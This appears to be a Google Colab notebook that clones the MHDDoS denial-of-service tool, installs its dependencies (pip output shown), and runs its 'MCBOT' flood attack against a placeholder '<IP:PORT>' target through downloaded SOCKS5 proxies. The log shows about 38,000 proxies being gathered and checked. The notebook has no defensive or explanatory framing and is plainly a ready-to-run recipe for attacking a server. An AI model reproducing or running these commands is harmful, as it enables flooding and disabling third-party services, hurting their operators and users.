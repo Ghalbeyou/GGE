{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO3ElWiTuDRod3pvq0yprSa",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Ghalbeyou/GGE/blob/main/MHDDoS.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Installing**"
      ],
      "metadata": {
        "id": "LP9Q50CU-NoC"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/MatrixTM/MHDDoS.git\n",
        "!pip install -r MHDDoS/requirements.txt"
      ],
      "metadata": {
        "id": "jc7pvcSi3RBZ",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "1f6cc435-63f1-4d73-92a6-b9aae89c9299"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Collecting git+https://github.com/MHProDev/PyRoxy.git (from -r MHDDoS/requirements.txt (line 9))\n",
            "  Cloning https://github.com/MHProDev/PyRoxy.git to /tmp/pip-req-build-bqp8sq0f\n",
            "  Running command git clone -q https://github.com/MHProDev/PyRoxy.git /tmp/pip-req-build-bqp8sq0f\n",
            "Collecting cloudscraper==1.2.64\n",
            "  Downloading cloudscraper-1.2.64-py2.py3-none-any.whl (97 kB)\n",
            "\u001b[K     |████████████████████████████████| 97 kB 2.7 MB/s \n",
            "\u001b[?25hRequirement already satisfied: certifi==2022.9.24 in /usr/local/lib/python3.7/dist-packages (from -r MHDDoS/requirements.txt (line 2)) (2022.9.24)\n",
            "Requirement already satisfied: dnspython==2.2.1 in /usr/local/lib/python3.7/dist-packages (from -r MHDDoS/requirements.txt (line 3)) (2.2.1)\n",
            "Collecting requests==2.27.1\n",
            "  Downloading requests-2.27.1-py2.py3-none-any.whl (63 kB)\n",
            "\u001b[K     |████████████████████████████████| 63 kB 1.6 MB/s \n",
            "\u001b[?25hCollecting impacket==0.10.0\n",
            "  Downloading impacket-0.10.0.tar.gz (1.4 MB)\n",
            "\u001b[K     |████████████████████████████████| 1.4 MB 61.7 MB/s \n",
            "\u001b[?25hCollecting psutil>=5.9.3\n",
            "  Downloading psutil-5.9.4-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (280 kB)\n",
            "\u001b[K     |████████████████████████████████| 280 kB 57.2 MB/s \n",
            "\u001b[?25hCollecting icmplib>=3.0.3\n",
            "  Downloading icmplib-3.0.3-py3-none-any.whl (30 kB)\n",
            "Requirement already satisfied: pyasn1==0.4.8 in /usr/local/lib/python3.7/dist-packages (from -r MHDDoS/requirements.txt (line 8)) (0.4.8)\n",
            "Requirement already satisfied: yarl~=1.8.1 in /usr/local/lib/python3.7/dist-packages (from -r MHDDoS/requirements.txt (line 10)) (1.8.1)\n",
            "Collecting maxminddb>=2.2.0\n",
            "  Downloading maxminddb-2.2.0.tar.gz (330 kB)\n",
            "\u001b[K     |████████████████████████████████| 330 kB 53.6 MB/s \n",
            "\u001b[?25hRequirement already satisfied: pysocks>=1.7.1 in /usr/local/lib/python3.7/dist-packages (from PyRoxy==1.0b5->-r MHDDoS/requirements.txt (line 9)) (1.7.1)\n",
            "Collecting requests-toolbelt>=0.9.1\n",
            "  Downloading requests_toolbelt-0.10.1-py2.py3-none-any.whl (54 kB)\n",
            "\u001b[K     |████████████████████████████████| 54 kB 2.4 MB/s \n",
            "\u001b[?25hRequirement already satisfied: pyparsing>=2.4.7 in /usr/local/lib/python3.7/dist-packages (from cloudscraper==1.2.64->-r MHDDoS/requirements.txt (line 1)) (3.0.9)\n",
            "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.7/dist-packages (from requests==2.27.1->-r MHDDoS/requirements.txt (line 4)) (1.24.3)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.7/dist-packages (from requests==2.27.1->-r MHDDoS/requirements.txt (line 4)) (2.10)\n",
            "Collecting charset-normalizer~=2.0.0\n",
            "  Downloading charset_normalizer-2.0.12-py3-none-any.whl (39 kB)\n",
            "Collecting pycryptodomex\n",
            "  Downloading pycryptodomex-3.15.0-cp35-abi3-manylinux2010_x86_64.whl (2.3 MB)\n",
            "\u001b[K     |████████████████████████████████| 2.3 MB 38.2 MB/s \n",
            "\u001b[?25hCollecting pyOpenSSL>=0.16.2\n",
            "  Downloading pyOpenSSL-22.1.0-py3-none-any.whl (57 kB)\n",
            "\u001b[K     |████████████████████████████████| 57 kB 4.3 MB/s \n",
            "\u001b[?25hRequirement already satisfied: six in /usr/local/lib/python3.7/dist-packages (from impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (1.15.0)\n",
            "Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5\n",
            "  Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)\n",
            "\u001b[K     |████████████████████████████████| 432 kB 49.8 MB/s \n",
            "\u001b[?25hCollecting ldapdomaindump>=0.9.0\n",
            "  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)\n",
            "Requirement already satisfied: flask>=1.0 in /usr/local/lib/python3.7/dist-packages (from impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (1.1.4)\n",
            "Requirement already satisfied: future in /usr/local/lib/python3.7/dist-packages (from impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (0.16.0)\n",
            "Requirement already satisfied: chardet in /usr/local/lib/python3.7/dist-packages (from impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (3.0.4)\n",
            "Requirement already satisfied: typing-extensions>=3.7.4 in /usr/local/lib/python3.7/dist-packages (from yarl~=1.8.1->-r MHDDoS/requirements.txt (line 10)) (4.1.1)\n",
            "Requirement already satisfied: multidict>=4.0 in /usr/local/lib/python3.7/dist-packages (from yarl~=1.8.1->-r MHDDoS/requirements.txt (line 10)) (6.0.2)\n",
            "Requirement already satisfied: itsdangerous<2.0,>=0.24 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (1.1.0)\n",
            "Requirement already satisfied: Werkzeug<2.0,>=0.15 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (1.0.1)\n",
            "Requirement already satisfied: Jinja2<3.0,>=2.10.1 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (2.11.3)\n",
            "Requirement already satisfied: click<8.0,>=5.1 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (7.1.2)\n",
            "Requirement already satisfied: MarkupSafe>=0.23 in /usr/local/lib/python3.7/dist-packages (from Jinja2<3.0,>=2.10.1->flask>=1.0->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (2.0.1)\n",
            "Collecting cryptography<39,>=38.0.0\n",
            "  Downloading cryptography-38.0.3-cp36-abi3-manylinux_2_24_x86_64.whl (4.1 MB)\n",
            "\u001b[K     |████████████████████████████████| 4.1 MB 37.5 MB/s \n",
            "\u001b[?25hRequirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.7/dist-packages (from cryptography<39,>=38.0.0->pyOpenSSL>=0.16.2->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (1.15.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.7/dist-packages (from cffi>=1.12->cryptography<39,>=38.0.0->pyOpenSSL>=0.16.2->impacket==0.10.0->-r MHDDoS/requirements.txt (line 5)) (2.21)\n",
            "Building wheels for collected packages: PyRoxy, impacket, maxminddb\n",
            "  Building wheel for PyRoxy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for PyRoxy: filename=PyRoxy-1.0b5-py3-none-any.whl size=2830049 sha256=8b1734bfc4f0d6c1a2e0542a137de93949ea99f3dd9fb009a75609880a1a8d5d\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-2j7so60x/wheels/3a/af/9a/40c4385ca8d291dcd364dd3ef98eb935d60ebade0e4b80150a\n",
            "  Building wheel for impacket (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for impacket: filename=impacket-0.10.0-py3-none-any.whl size=1452160 sha256=c3d3ad600fe0221cf74beb4535d8c9e3caad76839afe64d2ba7491cd985c4101\n",
            "  Stored in directory: /root/.cache/pip/wheels/61/ee/76/f9e7c74c26c12fb9f8587313baa0059314c4eec5cf49a55cf6\n",
            "  Building wheel for maxminddb (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for maxminddb: filename=maxminddb-2.2.0-py2.py3-none-any.whl size=16357 sha256=38ec4d3fc5a24477796adb720e2f26eb64137e4ca8da02deb33f5ae290368e06\n",
            "  Stored in directory: /root/.cache/pip/wheels/3b/eb/d9/b4407ec5d0ccddce61c8d2f4db72a68a77a04adea2245b98ef\n",
            "Successfully built PyRoxy impacket maxminddb\n",
            "Installing collected packages: charset-normalizer, requests, ldap3, cryptography, requests-toolbelt, pyOpenSSL, pycryptodomex, maxminddb, ldapdomaindump, PyRoxy, psutil, impacket, icmplib, cloudscraper\n",
            "  Attempting uninstall: charset-normalizer\n",
            "    Found existing installation: charset-normalizer 2.1.1\n",
            "    Uninstalling charset-normalizer-2.1.1:\n",
            "      Successfully uninstalled charset-normalizer-2.1.1\n",
            "  Attempting uninstall: requests\n",
            "    Found existing installation: requests 2.23.0\n",
            "    Uninstalling requests-2.23.0:\n",
            "      Successfully uninstalled requests-2.23.0\n",
            "  Attempting uninstall: psutil\n",
            "    Found existing installation: psutil 5.4.8\n",
            "    Uninstalling psutil-5.4.8:\n",
            "      Successfully uninstalled psutil-5.4.8\n",
            "Successfully installed PyRoxy-1.0b5 charset-normalizer-2.0.12 cloudscraper-1.2.64 cryptography-38.0.3 icmplib-3.0.3 impacket-0.10.0 ldap3-2.9.1 ldapdomaindump-0.9.3 maxminddb-2.2.0 psutil-5.9.4 pyOpenSSL-22.1.0 pycryptodomex-3.15.0 requests-2.27.1 requests-toolbelt-0.10.1\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.colab-display-data+json": {
              "pip_warning": {
                "packages": [
                  "psutil"
                ]
              }
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "*DDoS*"
      ],
      "metadata": {
        "id": "DJWNGS8l-SOD"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TWpwwapB2ef6",
        "outputId": "e49c0357-99f4-4ca8-d198-79e58c648d54"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[16:58:28 - WARNING] \u001b[93mThe file doesn't exist, creating files and downloading proxies.\u001b[0m\n",
            "[16:58:28 - INFO] \u001b[93mDownloading Proxies from \u001b[94m25\u001b[93m Providers\u001b[0m\n",
            "[16:58:35 - INFO] \u001b[94m38,541\u001b[93m Proxies are getting checked, this may take awhile\u001b[0m!\n"
          ]
        }
      ],
      "source": [
        "!python3 MHDDoS/start.py MCBOT <IP:PORT> 5 100 socks5.txt 100 100"
      ]
    }
  ]
}